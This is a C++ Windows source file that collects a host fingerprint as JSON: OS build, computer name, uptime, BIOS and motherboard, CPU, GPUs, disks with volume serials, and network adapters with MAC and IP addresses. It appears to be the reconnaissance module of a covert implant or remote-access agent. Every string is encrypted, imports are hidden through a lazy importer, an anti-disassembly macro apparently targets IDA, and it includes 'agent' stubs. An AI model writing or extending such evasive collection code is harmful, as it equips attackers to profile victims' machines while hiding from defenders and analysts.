#include "sysinfo.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <d3d11.h>
#include <dxgi.h>
#include <stdio.h>
#include <string.h>
#include "../dbg.hpp"
#include "pxenc.hpp"
#include "lazy_importer.hpp"
#include "brkida.hpp"
#include "agent_stubs.hpp"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "advapi32.lib")

#define JB_INIT_CAP (16 * 1024)

typedef struct _JB {
    char*  Buf;
    ULONG  Len;
    ULONG  Cap;
} JB;

static bool JbGrow(JB* b, ULONG need)
{
    if (b->Len + need + 1 <= b->Cap) return true;
    ULONG cap = b->Cap ? b->Cap : JB_INIT_CAP;
    while (cap < b->Len + need + 1) cap *= 2;
    char* nb = (char*)HeapReAlloc(GetProcessHeap(), 0, b->Buf, cap);
    if (!nb) return false;
    b->Buf = nb; b->Cap = cap; return true;
}
static bool JbInit(JB* b) {
    b->Buf = (char*)HeapAlloc(GetProcessHeap(), 0, JB_INIT_CAP);
    b->Len = 0; b->Cap = JB_INIT_CAP;
    if (!b->Buf) return false;
    b->Buf[0] = 0;
    return true;
}
static bool JbRaw(JB* b, const char* s, ULONG n) {
    if (!JbGrow(b, n)) return false;
    memcpy(b->Buf + b->Len, s, n);
    b->Len += n; b->Buf[b->Len] = 0;
    return true;
}
static bool JbStr(JB* b, const char* s) { return JbRaw(b, s, (ULONG)strlen(s)); }
static bool JbFmt(JB* b, const char* fmt, ...) {
    char tmp[1024];
    va_list ap; va_start(ap, fmt);
    int n = _vsnprintf_s(tmp, _TRUNCATE, fmt, ap);
    va_end(ap);
    if (n <= 0) return true;
    return JbRaw(b, tmp, (ULONG)n);
}
static bool JbEscUtf8(JB* b, const char* s) {
    if (!s) return JbStr(b, PX_A("\"\""));
    if (!JbStr(b, PX_A("\""))) return false;
    for (const unsigned char* p = (const unsigned char*)s; *p; ++p) {
        unsigned c = *p;
        switch (c) {
        case '"':  if (!JbStr(b, PX_A("\\\""))) return false; break;
        case '\\': if (!JbStr(b, PX_A("\\\\"))) return false; break;
        case '\b': if (!JbStr(b, PX_A("\\b")))  return false; break;
        case '\f': if (!JbStr(b, PX_A("\\f")))  return false; break;
        case '\n': if (!JbStr(b, PX_A("\\n")))  return false; break;
        case '\r': if (!JbStr(b, PX_A("\\r")))  return false; break;
        case '\t': if (!JbStr(b, PX_A("\\t")))  return false; break;
        default:
            if (c < 0x20) { if (!JbFmt(b, PX_A("\\u%04x"), c)) return false; }
            else          { char t[2] = { (char)c, 0 }; if (!JbStr(b, t)) return false; }
            break;
        }
    }
    return JbStr(b, PX_A("\""));
}
static bool JbEscW(JB* b, const wchar_t* w) {
    if (!w) return JbStr(b, PX_A("\"\""));
    int need = LI_KERNEL(WideCharToMultiByte)(CP_UTF8, 0, w, -1, NULL, 0, NULL, NULL);
    if (need <= 0) return JbStr(b, PX_A("\"\""));
    char* tmp = (char*)HeapAlloc(GetProcessHeap(), 0, need);
    if (!tmp) return JbStr(b, PX_A("\"\""));
    LI_KERNEL(WideCharToMultiByte)(CP_UTF8, 0, w, -1, tmp, need, NULL, NULL);
    bool r = JbEscUtf8(b, tmp);
    HeapFree(GetProcessHeap(), 0, tmp);
    return r;
}

typedef HRESULT (WINAPI *pfnRtlGetVersion)(RTL_OSVERSIONINFOEXW*);

static void
QueryWindowsInfo(
    JB* b
)
{
    OSVERSIONINFOEXW osv = { 0 };
    osv.dwOSVersionInfoSize = sizeof(osv);
    HMODULE nt = LI_KERNEL(GetModuleHandleW)(pxenc(L"ntdll.dll"));
    if (nt) {
        pfnRtlGetVersion pRtl = (pfnRtlGetVersion)LI_KERNEL(GetProcAddress)(nt, pxenc("RtlGetVersion"));
        if (pRtl) pRtl(&osv);
    }

    wchar_t productName[128] = { 0 };
    wchar_t displayVersion[64] = { 0 };
    ULONG   ubr = 0;
    {
        HKEY key = NULL;
        if (LI_ADVAPI(RegOpenKeyExW)(HKEY_LOCAL_MACHINE,
            pxenc(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
            0, KEY_READ | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS) {
            DWORD type = 0, cb = sizeof(productName);
            LI_ADVAPI(RegQueryValueExW)(key, pxenc(L"ProductName"), NULL, &type,
                                        (LPBYTE)productName, &cb);
            cb = sizeof(displayVersion);
            LI_ADVAPI(RegQueryValueExW)(key, pxenc(L"DisplayVersion"), NULL, &type,
                                        (LPBYTE)displayVersion, &cb);
            cb = sizeof(ubr);
            LI_ADVAPI(RegQueryValueExW)(key, pxenc(L"UBR"), NULL, &type,
                                        (LPBYTE)&ubr, &cb);
            LI_ADVAPI(RegCloseKey)(key);
        }
    }

    JbStr(b, PX_A("\"windows\":{"));
    JbStr(b, PX_A("\"productName\":"));   JbEscW(b, productName);
    JbStr(b, PX_A(",\"displayVersion\":")); JbEscW(b, displayVersion);
    JbFmt(b, PX_A(",\"majorVersion\":%lu"), osv.dwMajorVersion);
    JbFmt(b, PX_A(",\"minorVersion\":%lu"), osv.dwMinorVersion);
    JbFmt(b, PX_A(",\"buildNumber\":%lu"),  osv.dwBuildNumber);
    JbFmt(b, PX_A(",\"ubr\":%lu"),          ubr);
    JbFmt(b, PX_A(",\"servicePackMajor\":%u"), osv.wServicePackMajor);
    JbFmt(b, PX_A(",\"servicePackMinor\":%u"), osv.wServicePackMinor);
    JbStr(b, PX_A("}"));
}

static void
QueryComputerName(
    JB* b
)
{
    wchar_t name[256] = { 0 };
    DWORD   sz = 256;
    LI_KERNEL(GetComputerNameW)(name, &sz);
    JbStr(b, PX_A(",\"computerName\":"));
    JbEscW(b, name);
}

static void
QueryUptime(
    JB* b
)
{
    ULONGLONG ms = LI_KERNEL(GetTickCount64)();
    JbFmt(b, PX_A(",\"uptimeMs\":%llu"), (unsigned long long)ms);
}

static bool
ReadStringValue(
    HKEY           key,
    const wchar_t* name,
    wchar_t*       out,
    DWORD          outBytes
)
{
    if (outBytes == 0) return false;
    DWORD type = 0, cb = outBytes;
    out[0] = 0;
    LONG r = LI_ADVAPI(RegQueryValueExW)(key, name, NULL, &type, (LPBYTE)out, &cb);
    if (r != ERROR_SUCCESS) return false;
    if (type != REG_SZ && type != REG_EXPAND_SZ) return false;
    DWORD chars = cb / sizeof(wchar_t);
    if (chars == 0) { out[0] = 0; return false; }
    out[chars - 1] = 0;
    return true;
}

static void
QueryMotherboard(
    JB* b
)
{
    wchar_t manufacturer[128] = { 0 };
    wchar_t product[128]      = { 0 };
    wchar_t version[64]       = { 0 };
    wchar_t biosVendor[128]   = { 0 };
    wchar_t biosVersion[128]  = { 0 };

    HKEY key = NULL;
    if (LI_ADVAPI(RegOpenKeyExW)(HKEY_LOCAL_MACHINE,
        pxenc(L"HARDWARE\\DESCRIPTION\\System\\BIOS"),
        0, KEY_READ, &key) == ERROR_SUCCESS) {
        ReadStringValue(key, pxenc(L"BaseBoardManufacturer"), manufacturer, sizeof(manufacturer));
        ReadStringValue(key, pxenc(L"BaseBoardProduct"),      product,      sizeof(product));
        ReadStringValue(key, pxenc(L"BaseBoardVersion"),      version,      sizeof(version));
        ReadStringValue(key, pxenc(L"BIOSVendor"),            biosVendor,   sizeof(biosVendor));
        ReadStringValue(key, pxenc(L"BIOSVersion"),           biosVersion,  sizeof(biosVersion));
        LI_ADVAPI(RegCloseKey)(key);
    }

    JbStr(b, PX_A(",\"motherboard\":{"));
    JbStr(b, PX_A("\"manufacturer\":")); JbEscW(b, manufacturer);
    JbStr(b, PX_A(",\"product\":"));     JbEscW(b, product);
    JbStr(b, PX_A(",\"version\":"));     JbEscW(b, version);
    JbStr(b, PX_A(",\"biosVendor\":"));  JbEscW(b, biosVendor);
    JbStr(b, PX_A(",\"biosVersion\":")); JbEscW(b, biosVersion);
    JbStr(b, PX_A("}"));
}

static void
QueryProcessor(
    JB* b
)
{
    wchar_t name[128]  = { 0 };
    wchar_t vendor[32] = { 0 };
    wchar_t ident[128] = { 0 };
    DWORD   mhz        = 0;

    HKEY key = NULL;
    if (LI_ADVAPI(RegOpenKeyExW)(HKEY_LOCAL_MACHINE,
        pxenc(L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"),
        0, KEY_READ, &key) == ERROR_SUCCESS) {
        ReadStringValue(key, pxenc(L"ProcessorNameString"), name,   sizeof(name));
        ReadStringValue(key, pxenc(L"VendorIdentifier"),    vendor, sizeof(vendor));
        ReadStringValue(key, pxenc(L"Identifier"),          ident,  sizeof(ident));
        DWORD type = 0, cb = sizeof(mhz);
        LI_ADVAPI(RegQueryValueExW)(key, pxenc(L"~MHz"), NULL, &type, (LPBYTE)&mhz, &cb);
        LI_ADVAPI(RegCloseKey)(key);
    }

    SYSTEM_INFO si = { 0 };
    LI_KERNEL(GetNativeSystemInfo)(&si);

    for (int i = 0; name[i]; ++i) {
        if (name[i] == L' ' && name[i + 1] == L' ') {
            int j = i;
            while (name[j + 1] == L' ') j++;
            int shift = j - i;
            int k = i;
            for (; name[k + shift]; ++k) name[k] = name[k + shift];
            name[k] = 0;
        }
    }

    JbStr(b, PX_A(",\"processor\":{"));
    JbStr(b, PX_A("\"name\":"));          JbEscW(b, name);
    JbStr(b, PX_A(",\"vendor\":"));       JbEscW(b, vendor);
    JbStr(b, PX_A(",\"identifier\":"));   JbEscW(b, ident);
    JbFmt(b, PX_A(",\"mhz\":%lu"),        mhz);
    JbFmt(b, PX_A(",\"logicalCores\":%lu"), si.dwNumberOfProcessors);
    JbStr(b, PX_A("}"));
}

static void
QueryGpus(
    JB* b
)
{
    JbStr(b, PX_A(",\"gpus\":["));
    IDXGIFactory* factory = NULL;
    if (SUCCEEDED(LI_DXGI(CreateDXGIFactory)(__uuidof(IDXGIFactory), (void**)&factory))) {
        IDXGIAdapter* ad = NULL;
        UINT i = 0;
        bool first = true;
        while (factory->EnumAdapters(i, &ad) != DXGI_ERROR_NOT_FOUND) {
            DXGI_ADAPTER_DESC d = { 0 };
            if (SUCCEEDED(ad->GetDesc(&d))) {
                if (!first) JbStr(b, PX_A(","));
                first = false;
                JbStr(b, PX_A("{\"name\":")); JbEscW(b, d.Description);
                JbFmt(b, PX_A(",\"vendorId\":%u,\"deviceId\":%u,\"subSysId\":%u,\"revision\":%u"),
                      d.VendorId, d.DeviceId, d.SubSysId, d.Revision);
                JbFmt(b, PX_A(",\"dedicatedVideoMemory\":%llu"),   (unsigned long long)d.DedicatedVideoMemory);
                JbFmt(b, PX_A(",\"dedicatedSystemMemory\":%llu"),  (unsigned long long)d.DedicatedSystemMemory);
                JbFmt(b, PX_A(",\"sharedSystemMemory\":%llu"),     (unsigned long long)d.SharedSystemMemory);
                JbStr(b, PX_A("}"));
            }
            ad->Release(); ad = NULL;
            ++i;
        }
        factory->Release();
    }
    JbStr(b, PX_A("]"));
}

static void
QueryDisks(
    JB* b
)
{
    JbStr(b, PX_A(",\"disks\":["));
    DWORD mask = LI_KERNEL(GetLogicalDrives)();
    bool first = true;
    for (int i = 0; i < 26; ++i) {
        if (!(mask & (1u << i))) continue;
        wchar_t root[4] = { (wchar_t)(L'A' + i), L':', L'\\', 0 };
        UINT type = LI_KERNEL(GetDriveTypeW)(root);
        if (type != DRIVE_FIXED && type != DRIVE_REMOVABLE && type != DRIVE_REMOTE)
            continue;

        wchar_t label[MAX_PATH + 1] = { 0 };
        wchar_t fs[32] = { 0 };
        DWORD   serial = 0, maxComp = 0, flags = 0;
        BOOL ok = LI_KERNEL(GetVolumeInformationW)(root, label, MAX_PATH,
                                                   &serial, &maxComp, &flags,
                                                   fs, 32);
        (void)ok;

        ULARGE_INTEGER freeToCaller = { 0 }, total = { 0 }, freeBytes = { 0 };
        BOOL sok = LI_KERNEL(GetDiskFreeSpaceExW)(root, &freeToCaller, &total, &freeBytes);

        if (!first) JbStr(b, PX_A(","));
        first = false;
        JbStr(b, PX_A("{\"root\":"));        JbEscW(b, root);
        JbStr(b, PX_A(",\"label\":"));       JbEscW(b, label);
        JbStr(b, PX_A(",\"fileSystem\":"));  JbEscW(b, fs);
        const char* driveType =
            type == DRIVE_FIXED     ? PX_A("fixed")     :
            type == DRIVE_REMOVABLE ? PX_A("removable") :
            type == DRIVE_REMOTE    ? PX_A("remote")    : PX_A("other");
        JbStr(b, PX_A(",\"driveType\":"));   JbEscUtf8(b, driveType);
        if (sok) {
            JbFmt(b, PX_A(",\"totalBytes\":%llu"), (unsigned long long)total.QuadPart);
            JbFmt(b, PX_A(",\"freeBytes\":%llu"),  (unsigned long long)freeBytes.QuadPart);
        }
        JbStr(b, PX_A("}"));
    }
    JbStr(b, PX_A("]"));
}

static void
QueryNics(
    JB* b
)
{
    JbStr(b, PX_A(",\"networks\":["));

    ULONG bufLen = 0;
    IP_ADAPTER_ADDRESSES* addrs = NULL;
    ULONG family = AF_UNSPEC;
    ULONG flags  = GAA_FLAG_INCLUDE_PREFIX |
                   GAA_FLAG_SKIP_ANYCAST   |
                   GAA_FLAG_SKIP_MULTICAST |
                   GAA_FLAG_SKIP_DNS_SERVER;

    LI_IPHLPAPI(GetAdaptersAddresses)(family, flags, NULL, NULL, &bufLen);
    if (bufLen == 0) { JbStr(b, PX_A("]")); return; }
    addrs = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), 0, bufLen);
    if (!addrs) { JbStr(b, PX_A("]")); return; }
    if (LI_IPHLPAPI(GetAdaptersAddresses)(family, flags, NULL, addrs, &bufLen) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, addrs);
        JbStr(b, PX_A("]"));
        return;
    }

    bool first = true;
    for (IP_ADAPTER_ADDRESSES* a = addrs; a; a = a->Next) {
        if (!first) JbStr(b, PX_A(","));
        first = false;

        JbStr(b, PX_A("{\"name\":"));        JbEscUtf8(b, a->AdapterName);
        JbStr(b, PX_A(",\"description\":")); JbEscW(b, a->Description);
        JbStr(b, PX_A(",\"friendly\":"));    JbEscW(b, a->FriendlyName);
        JbFmt(b, PX_A(",\"ifType\":%lu"),    a->IfType);

        const char* status =
            a->OperStatus == IfOperStatusUp             ? PX_A("up")             :
            a->OperStatus == IfOperStatusDown           ? PX_A("down")           :
            a->OperStatus == IfOperStatusTesting        ? PX_A("testing")        :
            a->OperStatus == IfOperStatusUnknown        ? PX_A("unknown")        :
            a->OperStatus == IfOperStatusDormant        ? PX_A("dormant")        :
            a->OperStatus == IfOperStatusNotPresent     ? PX_A("not-present")    :
            a->OperStatus == IfOperStatusLowerLayerDown ? PX_A("lower-down")     : PX_A("other");
        JbStr(b, PX_A(",\"operStatus\":"));  JbEscUtf8(b, status);

        JbFmt(b, PX_A(",\"receiveSpeedBps\":%llu"),  (unsigned long long)a->ReceiveLinkSpeed);
        JbFmt(b, PX_A(",\"transmitSpeedBps\":%llu"), (unsigned long long)a->TransmitLinkSpeed);

        JbStr(b, PX_A(",\"mac\":\""));
        for (ULONG j = 0; j < a->PhysicalAddressLength; ++j) {
            char octet[4];
            _snprintf_s(octet, _TRUNCATE, PX_A("%02X%s"),
                        a->PhysicalAddress[j],
                        (j + 1 < a->PhysicalAddressLength) ? PX_A("-") : PX_A(""));
            JbStr(b, octet);
        }
        JbStr(b, PX_A("\""));

        JbStr(b, PX_A(",\"ips\":["));
        bool firstIp = true;
        for (IP_ADAPTER_UNICAST_ADDRESS* ua = a->FirstUnicastAddress; ua; ua = ua->Next) {
            char ip[128] = { 0 };
            void* src = NULL;
            if (ua->Address.lpSockaddr->sa_family == AF_INET)
                src = &((sockaddr_in*)ua->Address.lpSockaddr)->sin_addr;
            else if (ua->Address.lpSockaddr->sa_family == AF_INET6)
                src = &((sockaddr_in6*)ua->Address.lpSockaddr)->sin6_addr;
            if (src && LI_WS2(inet_ntop)(ua->Address.lpSockaddr->sa_family, src, ip, sizeof(ip))) {
                if (!firstIp) JbStr(b, PX_A(","));
                firstIp = false;
                JbEscUtf8(b, ip);
            }
        }
        JbStr(b, PX_A("]"));

        JbStr(b, PX_A("}"));
    }
    HeapFree(GetProcessHeap(), 0, addrs);
    JbStr(b, PX_A("]"));
}

bool
SysInfoCollectJson(
    char** OutJson,
    ULONG* OutLen
)
{
    BRKIDA;
    if (!OutJson || !OutLen) return false;
    *OutJson = NULL; *OutLen = 0;

    JB b = { 0 };
    if (!JbInit(&b)) return false;

    __try {
        JbStr(&b, PX_A("{"));
        QueryWindowsInfo(&b);
        QueryComputerName(&b);
        QueryUptime(&b);
        QueryMotherboard(&b);
        QueryProcessor(&b);
        QueryGpus(&b);
        QueryDisks(&b);
        QueryNics(&b);
        JbStr(&b, PX_A("}"));
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        HeapFree(GetProcessHeap(), 0, b.Buf);
        return false;
    }

    *OutJson = b.Buf;
    *OutLen  = b.Len;
    return true;
}

void
SysInfoFree(
    char* Json
)
{
    if (Json) HeapFree(GetProcessHeap(), 0, Json);
}
